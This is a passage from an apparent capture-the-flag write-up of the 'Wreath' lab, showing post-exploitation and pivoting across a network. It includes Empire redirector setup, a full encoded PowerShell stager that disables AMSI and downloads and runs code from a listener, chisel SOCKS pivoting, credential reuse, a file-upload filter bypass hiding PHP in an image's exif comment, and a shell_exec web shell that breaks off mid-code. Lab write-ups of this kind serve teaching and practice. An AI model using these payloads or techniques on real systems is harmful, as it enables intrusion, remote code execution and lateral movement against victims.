</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span><span style="color:#fe8019">(</span>Empire: uselistener/http_hop<span style="color:#fe8019">)</span> &gt; <span style="color:#fabd2f">set</span> Port <span style="color:#d3869b">9999</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>INFO: Set Port to <span style="color:#d3869b">9999</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span><span style="color:#fe8019">(</span>Empire: uselistener/http_hop<span style="color:#fe8019">)</span> &gt; <span style="color:#fabd2f">set</span> Name
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span><span style="color:#fe8019">(</span>Empire: uselistener/http_hop<span style="color:#fe8019">)</span> &gt; <span style="color:#fabd2f">set</span> Name HOPPA
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>INFO: Set Name to HOPPA<span style="color:#fe8019">](</span>&lt;<span style="color:#fe8019">(</span>Empire: uselistener/http_hop<span style="color:#fe8019">)</span> %3E <span style="color:#fabd2f">set</span> Host
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span><span style="color:#fe8019">(</span>Empire: uselistener/http_hop<span style="color:#fe8019">)</span> &gt; <span style="color:#fabd2f">set</span> Host 10.50.85.139
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>INFO: Set Host to 10.50.85.139
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span><span style="color:#fe8019">(</span>Empire: uselistener/http_hop<span style="color:#fe8019">)</span> &gt; <span style="color:#fabd2f">set</span> Port <span style="color:#d3869b">9999</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span>INFO: Set Port to <span style="color:#d3869b">9999</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span><span style="color:#fe8019">(</span>Empire: uselistener/http_hop<span style="color:#fe8019">)</span> &gt; <span style="color:#fabd2f">set</span> Name
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">14</span><span><span style="color:#fe8019">(</span>Empire: uselistener/http_hop<span style="color:#fe8019">)</span> &gt; <span style="color:#fabd2f">set</span> Name HOPPA
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">15</span><span>INFO: Set Name to HOPPA
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">16</span><span><span style="color:#fe8019">(</span>Empire: uselistener/http_hop<span style="color:#fe8019">)</span> &gt; <span style="color:#fabd2f">set</span> RedirectListener
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">17</span><span><span style="color:#fe8019">(</span>Empire: uselistener/http_hop<span style="color:#fe8019">)</span> &gt; <span style="color:#fabd2f">set</span> RedirectListener CLIHTTP
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">18</span><span>INFO: Set RedirectListener to CLIHTTP
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">19</span><span><span style="color:#fe8019">(</span>Empire: uselistener/http_hop<span style="color:#fe8019">)</span> &gt; <span style="color:#fabd2f">set</span> RedirectListener CLIHTTP
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">20</span><span>INFO: Set RedirectListener to CLIHTTP&gt;<span style="color:#fe8019">)</span>
</span></span></code></pre></div><p>There will now be a folder in <code>tmp</code> by the name the listener containing the redirecter files.</p>
<p>Zip the files up:</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fabd2f">cd</span> /tmp/http_hop <span style="color:#fe8019">&amp;&amp;</span> sudo zip -r hop.zip *
</span></span></code></pre></div><p>Put them on the server:</p>
<pre tabindex="0"><code>curl http://10.50.85.139/hop.zip --output hop.zip
</code></pre><p>Serve the files on a php web server:</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>php -S 0.0.0.0:9999 &amp;&gt;/dev/null &amp;
</span></span></code></pre></div><p>We also have to open up the firewall and ensure the port from our existing listener is also open:</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>firewall-cmd --zone<span style="color:#fe8019">=</span>public --add-port 9999/tcp
</span></span></code></pre></div><p>We also need a stager</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>usestager multi_launcher
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span><span style="color:#fabd2f">set</span> Listener HOPPA
</span></span></code></pre></div><p>Drop our payload through the web shell (make sure the sshuttle connection is still open to proxy traffic through):</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAcgBvAHgAeQA9AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARABlAGYAYQB1AGwAdABXAGUAYgBQAHIAbwB4AHkAOwAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwA9AC0AdABVAGIAWAByAEMAKgAyAEUAbQBuADcAOQAhAE4AbAB+ADwAMQB5AHAAUgBZAHsAMwBrAEsAPgBvADYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQA3AHgAYQBUADAAbgBSAHAAbgA4AHMAUABaADkAUQBnAGYAcwBoADgAWgA0AHAAVgBKAHoARQA9ACIAKQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAQQBEAEEAQQBMAGcAQQAxAEEARABBAEEATABnAEEANABBAEQAVQBBAEwAZwBBAHgAQQBEAE0AQQBPAFEAQQA2AEEARABrAEEATwBRAEEANQBBAEQAawBBACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABoAG8AcAA9ACcASABPAFAAUABBACcAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
</span></span></code></pre></div><h4 id="modules">Modules</h4>
<p>We can use modules, such as mimikatz, sherlock, etc on the compromised target afterwards.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>interact &lt;agent_name&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>usemodule &lt;module_name&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">3</span><span>options
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">4</span><span>execute
</span></span></code></pre></div><h4 id="shell">Shell</h4>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>shell
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span><span style="color:#fabd2f">exit</span> with ctrl+c
</span></span></code></pre></div><h4 id="enumeration-on-the-pc">Enumeration on the PC</h4>
<p>We now have the git-serv checking in as an agent in empire and can arbitrarily upload and download files using evil-winrm. We can use this to further enumerate into the network.</p>
<p>We will upload <code>nc.exe</code> and <code>Invoke-Portscan.ps1</code> using evil-winrm&rsquo;s upload feature.</p>
<pre tabindex="0"><code>. .\Invoke-Portscan.ps1
Get-Help Invoke-Portscan
Invoke-Portscan -Hosts 10.200.84.100 -TopPorts 50
</code></pre><p>This was not working well for some reason, but if I just tried to connect to the two ports I suspected were open, they were.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span>*<span style="color:#fabd2f">Evil-WinRM</span>* <span style="color:#fabd2f">PS </span>C:\windows\temp&gt; <span style="color:#fabd2f">Test-NetConnection</span> -Port 80 -Computer 10.200.84.100
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>ComputerName     : 10.200.84.100
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>RemoteAddress    : 10.200.84.100
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span>RemotePort       : 80
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span>InterfaceAlias   : Ethernet
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>SourceAddress    : 10.200.84.150
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span>TcpTestSucceeded : True
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span>*<span style="color:#fabd2f">Evil-WinRM</span>* <span style="color:#fabd2f">PS </span>C:\windows\temp&gt; <span style="color:#fabd2f">Test-NetConnection</span> -Port 3389 -Computer 10.200.84.100
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">14</span><span>ComputerName     : 10.200.84.100
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">15</span><span>RemoteAddress    : 10.200.84.100
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">16</span><span>RemotePort       : 3389
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">17</span><span>InterfaceAlias   : Ethernet
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">18</span><span>SourceAddress    : 10.200.84.150
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">19</span><span>TcpTestSucceeded : True
</span></span></code></pre></div><h4 id="pivoting-even-further">Pivoting Even Further</h4>
<p>To pivot even further we will require a firewall rule for the proxy that I am going to start.</p>
<pre tabindex="0"><code>netsh advfirewall firewall add rule name=&#34;Chisel-gabad00&#34; dir=in action=allow protocol=tcp localport=9900
</code></pre><div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>.\chisel.exe server -p 9900 --socks5.\chisel.exe server -p 9900 --socks5 - our windows host
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>./chisel client 10.200.84.150:9900 1080:socks
</span></span></code></pre></div><p>The proxy took forever to boot up, but it did and that is what matters. Now we can see this webpage and attack it through traffic we send via proxychains.</p>
<p>We can get some insight into the tech stack here from the headers.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">HTTP</span><span style="color:#fe8019">/</span><span style="color:#d3869b">1.1</span> <span style="color:#d3869b">304</span> <span style="color:#fb4934">Not Modified</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>Date<span style="color:#fe8019">:</span> Sat, 08 Jul 2023 22:30:04 GMT
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">3</span><span>Server<span style="color:#fe8019">:</span> Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">4</span><span>Connection<span style="color:#fe8019">:</span> Keep-Alive
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">5</span><span>Keep-Alive<span style="color:#fe8019">:</span> timeout=5, max=100
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">6</span><span>ETag<span style="color:#fe8019">:</span> &#34;3dc7-5b39a5a80eecc&#34;
</span></span></code></pre></div><p>Side note: I just recently learned about 304 status codes.</p>
<p>Since we have access to the source code via the git server, we can see if there are any interesting findings there.</p>
<p>I leveraged starkiller to find the code, and looked around in the gui file manager. I attempted to leverage some findstr commands but was unsuccessful.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>c:<span style="color:#fb4934">\gitstack\repositories\website.git</span>
</span></span></code></pre></div><p>I also ended up using starkiller to download the files.
One we have the files, we can use <a href="https://github.com/internetwache/GitTools">Git Tools</a>to do some analysis.</p>
<p>We will use extractor to recreate the repo.</p>
<p>What we need is a directory with git files and a directory to put the rebuilt files in. The git files need to be properly renamed .git and a subdirectory of another folder. The output folder will be created if it does not exist.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">[</span>~/thm/wreath<span style="color:#fe8019">]</span>$ ./extractor.sh git-shenanigans stuff
</span></span></code></pre></div><p>The writeup provided this lovely bash one-liner to get our commit info all formatted nicely:</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>separator<span style="color:#fe8019">=</span><span style="color:#b8bb26">&#34;=======================================&#34;</span>; <span style="color:#fe8019">for</span> i in <span style="color:#fe8019">$(</span>ls<span style="color:#fe8019">)</span>; <span style="color:#fe8019">do</span> <span style="color:#fabd2f">printf</span> <span style="color:#b8bb26">&#34;\n\n</span>$separator<span style="color:#b8bb26">\n\033[4;1m</span>$i<span style="color:#b8bb26">\033[0m\n</span><span style="color:#fe8019">$(</span>cat $i/commit-meta.txt<span style="color:#fe8019">)</span><span style="color:#b8bb26">\n&#34;</span>; <span style="color:#fe8019">done</span>; <span style="color:#fabd2f">printf</span> <span style="color:#b8bb26">&#34;\n\n</span>$separator<span style="color:#b8bb26">\n\n\n&#34;</span>
</span></span></code></pre></div><pre tabindex="0"><code>
=======================================
0-70dde80cc19ec76704567996738894828f4ee895
tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
author twreath &lt;me@thomaswreath.thm&gt; 1604849458 +0000
committer twreath &lt;me@thomaswreath.thm&gt; 1604849458 +0000

Static Website Commit


=======================================
1-345ac8b236064b431fa43f53d91c98c4834ef8f3
tree c4726fef596741220267e2b1e014024b93fced78
parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
author twreath &lt;me@thomaswreath.thm&gt; 1609614315 +0000
committer twreath &lt;me@thomaswreath.thm&gt; 1609614315 +0000

Updated the filter


=======================================
2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
parent 70dde80cc19ec76704567996738894828f4ee895
author twreath &lt;me@thomaswreath.thm&gt; 1608592351 +0000
committer twreath &lt;me@thomaswreath.thm&gt; 1608592351 +0000

Initial Commit for the back-end


=======================================
</code></pre><p>The number at the start of these directories is arbitrary, and depends on the order in which GitTools extracts the directories. What matters is the hash at the end of the filename.</p>
<p>By the commit hashes, the most up to date is <code>1-345ac8b236064b431fa43f53d91c98c4834ef8f3</code>.</p>
<p>What we are interested in here is php.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">[</span>~/thm/wreath/stuff/1-345ac8b236064b431fa43f53d91c98c4834ef8f3<span style="color:#fe8019">]</span>$ find . -name <span style="color:#b8bb26">&#34;*.php&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>./resources/index.php
</span></span></code></pre></div><p>Looking at the file upload filtering, we can see that there is:</p>
<ol>
<li>A filter on the extensions when files are being uploaded</li>
<li>A check on the imageSize in the exif data</li>
<li>the files are going to the uploads directory</li>
</ol>
<p>We can go to <code>resources</code> where we get prompted for basic auth.</p>
<p>We have seen a number of username possibilities including:</p>
<ol>
<li>twreath</li>
<li>thomaswreath</li>
<li>thomas</li>
</ol>
<p>We also have a hash from the previous machine that we have cracked and know to be:</p>
<pre tabindex="0"><code>i&lt;3ruby
</code></pre><p>The right combo appeared to be <code>thomas:i&lt;3ruby</code></p>
<p>Now, we have the ability to upload files to the webserver.</p>
<p>We can download an image and start testing filter bypasses.</p>
<p>The filter is only checking that there is an allowed file extension somewhere, so we can tack a .php on the end.</p>
<p>The next question is where to put our webshell. That would be the comment field.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>cp image.jpg gabad00-shell.jpeg.php
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>exiftool -Comment<span style="color:#fe8019">=</span><span style="color:#b8bb26">&#34;&lt;?php echo \&#34;&lt;pre&gt;Test Payload&lt;/pre&gt;\&#34;; die(); ?&gt;&#34;</span> gabad00-shell.jpeg.php
</span></span></code></pre></div><p>Now, we can upload our file, and see we successfully bypassed the filter.</p>
<p>We can execute the payload if we go to <code>resources/uploads/$FILE</code>.</p>
<p>It executes!</p>
<p>Now, we have to reckon with antivirus.</p>
<h4 id="av-bypass">AV Bypass</h4>
<p>This, is the PHP code we will be using for our shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span><span style="color:#fe8019">&lt;?</span>php
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">2</span><span>    $cmd <span style="color:#fe8019">=</span> $_GET[<span style="color:#b8bb26">&#34;wreath&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">3</span><span>    <span style="color:#fe8019">if</span>(isset($cmd)){
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">4</span><span>        <span style="color:#fe8019">echo</span> <span style="color:#b8bb26">&#34;&lt;pre&gt;&#34;</span> <span style="color:#fe8019">.</span> shell_exec($cmd) <span style="color:#fe8019">.</span> <span style="color:#b8bb26">&#34;&lt;/pre&gt;&#34;</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">5</span><span>    }
